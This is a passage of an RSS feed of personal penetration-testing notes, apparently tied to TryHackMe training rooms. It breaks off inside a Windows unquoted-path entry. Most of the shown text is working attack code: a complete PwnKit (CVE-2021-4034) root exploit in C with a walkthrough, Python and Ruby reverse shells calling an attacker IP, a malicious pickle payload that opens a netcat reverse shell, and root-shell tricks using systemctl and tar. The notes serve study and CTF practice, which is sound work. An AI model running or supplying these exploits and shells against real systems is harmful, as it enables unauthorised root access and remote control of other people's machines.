&lt;span id=&quot;cb7-29&quot;&gt;&lt;a href=&quot;#cb7-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb7-30&quot;&gt;&lt;a href=&quot;#cb7-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-31&quot;&gt;&lt;a href=&quot;#cb7-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *argv[]) {&lt;/span&gt;
&lt;span id=&quot;cb7-32&quot;&gt;&lt;a href=&quot;#cb7-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *fp;&lt;/span&gt;
&lt;span id=&quot;cb7-33&quot;&gt;&lt;a href=&quot;#cb7-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;mkdir -p &amp;#39;GCONV_PATH=.&amp;#39;; touch &amp;#39;GCONV_PATH=./pwnkit&amp;#39;; chmod a+x &amp;#39;GCONV_PATH=./pwnkit&amp;#39;&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb7-34&quot;&gt;&lt;a href=&quot;#cb7-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;mkdir -p pwnkit; echo &amp;#39;module UTF-8// PWNKIT// pwnkit 2&amp;#39; &amp;gt; pwnkit/gconv-modules&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb7-35&quot;&gt;&lt;a href=&quot;#cb7-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    fp = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;pwnkit/pwnkit.c&amp;quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb7-36&quot;&gt;&lt;a href=&quot;#cb7-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    fprintf(fp, &lt;span class=&quot;st&quot;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, shell);&lt;/span&gt;
&lt;span id=&quot;cb7-37&quot;&gt;&lt;a href=&quot;#cb7-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    fclose(fp);&lt;/span&gt;
&lt;span id=&quot;cb7-38&quot;&gt;&lt;a href=&quot;#cb7-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb7-39&quot;&gt;&lt;a href=&quot;#cb7-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *env[] = { &lt;span class=&quot;st&quot;&gt;&amp;quot;pwnkit&amp;quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&amp;quot;PATH=GCONV_PATH=.&amp;quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&amp;quot;CHARSET=PWNKIT&amp;quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&amp;quot;SHELL=pwnkit&amp;quot;&lt;/span&gt;, NULL };&lt;/span&gt;
&lt;span id=&quot;cb7-40&quot;&gt;&lt;a href=&quot;#cb7-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    execve(&lt;span class=&quot;st&quot;&gt;&amp;quot;/usr/bin/pkexec&amp;quot;&lt;/span&gt;, (&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;*[]){NULL}, env);&lt;/span&gt;
&lt;span id=&quot;cb7-41&quot;&gt;&lt;a href=&quot;#cb7-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The exploit is then as simple as &lt;code&gt;gcc $FILE -o exploit; ./exploit&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;This version of the exploit will leave traces in the target's logs!&lt;/em&gt;&lt;/p&gt;&lt;p&gt;Here's what happens on execution:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(1)&lt;/strong&gt; The exploit creates the path &lt;code&gt;GCONV_PATH=.&lt;/code&gt; in the current directory and adds an invalid executable file to it.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(2)&lt;/strong&gt; The exploit creates a second directory called &lt;code&gt;pwnkit&lt;/code&gt; and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set &quot;PWNKIT&quot;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(3)&lt;/strong&gt; The exploit calls &lt;code&gt;pkexec&lt;/code&gt; with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 â so, not even to contain the name of &lt;code&gt;pkexec&lt;/code&gt; itself) &lt;em&gt;but&lt;/em&gt; with a correctly set up (albeit malicious) environment via &lt;code&gt;execve()&lt;/code&gt;. Importantly, the first &quot;variable&quot; in the environment is actually the name of the (invalid) executable in the &lt;code&gt;GCONV_PATH=.&lt;/code&gt; directory.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(4)&lt;/strong&gt; Polkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that's passed into &lt;code&gt;execve()&lt;/code&gt;, which happens to be string &lt;code&gt;pwnkit&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(5)&lt;/strong&gt; Polkit looks up the malicious executable, finds it in &lt;code&gt;GCONV_PATH=./pwnkit&lt;/code&gt; (because we set the PATH to that directory), and then tries to replace the executable name with this full path. &lt;em&gt;Except&lt;/em&gt; that it's still writing to the first element of the environment, which causes &lt;code&gt;pwnkit&lt;/code&gt; to be replaced by &lt;code&gt;GCONV_PATH=./pwnkit&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(6)&lt;/strong&gt; Polkit the proceeds to sanitize its environment. When it comes to the invalid SHELL variable this sanitization fails and Polkit throws an error and dies. &lt;em&gt;But!&lt;/em&gt; Before dying, Polkit tries to &lt;em&gt;print&lt;/em&gt; the error using a GLib function that dutifully attempts to translate the message into the &quot;PWNKIT&quot; character set. To figure out how to do this, modules are loaded from GCONV_PATHâ¦ And we've defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since &lt;code&gt;pkexec&lt;/code&gt; is SUID root).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/pwnkit&quot;&gt;TryHackMe: Pwnkit (CVE-2021-4034)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/arthepsy/CVE-2021-4034&quot;&gt;arthepsy / CVE-2021-4034&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot;&gt;pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 11 Apr 2023 03:35:54 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Polkit.md</guid>
		</item>
		<item>
			<title>Exploiting Python</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Python.md</link>
			<description>&lt;h2 id=&quot;a-simple-reverse-shell&quot;&gt;A Simple Reverse Shell&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; socket&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; subprocess&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; os&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;attacker_ip &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;10.0.0.1&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;attacker_port &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;1234&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;s &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;s.&lt;span class=&quot;ex&quot;&gt;connect&lt;/span&gt;((attacker_ip, attacker_port))&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;os.dup2(s.fileno(), &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;os.dup2(s.fileno(), &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;os.dup2(s.fileno(), &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;subprocess.call([&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&amp;quot;-i&amp;quot;&lt;/span&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch it with netcat or socat.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;python-pickles&quot;&gt;Python Pickles&lt;/h2&gt;&lt;p&gt;One way to attack Python webapps is to exploit the pickle.loads() operation, which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like &lt;code&gt;object.__reduce__()&lt;/code&gt; are run.&lt;/p&gt;&lt;p&gt;For example, the TryHackMe: OWASP Top 10 room has us use the following code to create a malicious base64 encoded object to feed pickle.loads() (LOCAL_IP gets replaced by your machine's IP):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; pickle       &lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; sys      &lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; base64       &lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;command &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc LOCAL_IP 4444 &amp;gt; /tmp/f&amp;#39;&lt;/span&gt;      &lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; rce(&lt;span class=&quot;bu&quot;&gt;object&lt;/span&gt;):      &lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;def&lt;/span&gt; __reduce__(&lt;span class=&quot;va&quot;&gt;self&lt;/span&gt;):       &lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; os       &lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; (os.system,(command,))       &lt;/span&gt;
&lt;span id=&quot;cb2-11&quot;&gt;&lt;a href=&quot;#cb2-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-12&quot;&gt;&lt;a href=&quot;#cb2-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt;(base64.b64encode(pickle.dumps(rce())))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What's getting encoded here is the &lt;code&gt;rce&lt;/code&gt; class. Python will call &lt;code&gt;rce.__reduce__()&lt;/code&gt; to determine how to initialize this class when pickle.loads() deserializes it, and &lt;code&gt;__reduce__()&lt;/code&gt; wil return the tuple &lt;code&gt;(os.system, (command,))&lt;/code&gt;, where &lt;code&gt;command&lt;/code&gt; is basically our standard Metasploit reverse shell. Python then initializes the class by using os.system to call &lt;code&gt;command&lt;/code&gt;, and there's our reverse shell!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://davidhamann.de/2020/04/05/exploiting-python-pickle/&quot;&gt;Exploiting Python pickles&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;pickle - Python object serialization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 11 Apr 2023 03:35:54 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Python.md</guid>
		</item>
		<item>
			<title>Exploiting Ruby</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Ruby.md</link>
			<description>&lt;p&gt;A simple reverse shell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode ruby&quot;&gt;&lt;code class=&quot;sourceCode ruby&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;require &lt;span class=&quot;st&quot;&gt;&amp;quot;socket&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;attacker_ip = &lt;span class=&quot;st&quot;&gt;&amp;quot;10.0.0.1&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;attacker_port = &lt;span class=&quot;dv&quot;&gt;1234&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;f = &lt;span class=&quot;dt&quot;&gt;TCPSocket&lt;/span&gt;.open(attacker_ip, attacker_port).to_i&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;exec sprintf(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;&lt;/span&gt;, f, f, f)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch it with netcat or socat.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.tutorialspoint.com/ruby/ruby_socket_programming.htm&quot;&gt;Ruby - Socket Programming&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Tue, 11 Apr 2023 03:35:54 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Ruby.md</guid>
		</item>
		<item>
			<title>Exploiting "systemctl"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22systemctl%22.md</link>
			<description>&lt;p&gt;If systemctl is SUID root, then a malicious service file can easily be abused to create a root shell.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;FILE=&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;mktemp&lt;/span&gt; -u&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;[Service]&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Type=oneshot&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;ExecStart=/bin/cp /bin/bash &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;.sh&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;ExecStart=/bin/chmod +xs &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;.sh&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;[Install]&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;WantedBy=multi-user.target&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; link &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; start &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;.service&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;.sh&lt;/span&gt; -p # Root!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Even if systemctl is not SUID root, so long as you have NOPASSWD sudo access to it this trick will work.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/systemctl/&quot;&gt;GTFOBins: systemctl&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22systemctl%22.md</guid>
		</item>
		<item>
			<title>Exploiting "tar"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22tar%22.md</link>
			<description>&lt;p&gt;Tar can be configured to execute an action for every N files processed using the &lt;code&gt;--checkpoint&lt;/code&gt; and &lt;code&gt;--checkpoint-action&lt;/code&gt; flags. So this will get us a shell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;tar&lt;/span&gt; -cf /dev/null /dev/null &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--checkpoint&lt;/span&gt;=1 --checkpoint-action=exec=/bin/sh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This works with any input/output file (not just /dev/null), and with any executable binary (such as a reverse shell).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/&quot;&gt;GTFOBins: tar&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20%22tar%22.md</guid>
		</item>
		<item>
			<title>Exploiting Unquoted Paths</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Unquoted%20Paths.md</link>
			<description>&lt;p&gt;When Windows encounters an unquoted path it tries &lt;em&gt;all&lt;/em&gt; possible paths, from shortest to longest. Thus &lt;code&gt;C:\Program Files\Application Path\App.exe&lt;/code&gt; will cause Windows to look for the following executables, in order:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;C:\Program.exe&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;C:\Program Files\Application.exe&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;C:\Program Files\Application Path\App.exe&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;exploiting-services-running-as-system&quot;&gt;Exploiting Services Running as SYSTEM&lt;/h2&gt;&lt;p&gt;If a service is running as SYSTEM, the following code can be inserted (as &lt;code&gt;Program.exe&lt;/code&gt; or &lt;code&gt;Application.exe&lt;/code&gt; in the example above) and will add a new user with admin privileges. (&lt;code&gt;USERNAME&lt;/code&gt; and 